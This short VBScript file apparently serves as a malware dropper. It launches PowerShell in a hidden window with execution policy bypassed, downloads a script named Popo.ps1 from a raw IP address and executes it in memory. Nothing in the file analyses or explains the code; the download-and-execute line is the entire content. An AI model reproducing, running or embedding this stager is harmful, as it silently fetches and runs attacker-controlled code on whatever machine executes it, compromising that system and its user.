Set objShell = CreateObject("Wscript.shell")
objShell.Run("powershell.exe -exec Bypass -C  IEX(New-Object Net.Webclient).DownloadString('https://194.147.5.54/dev/Popo.ps1')"),0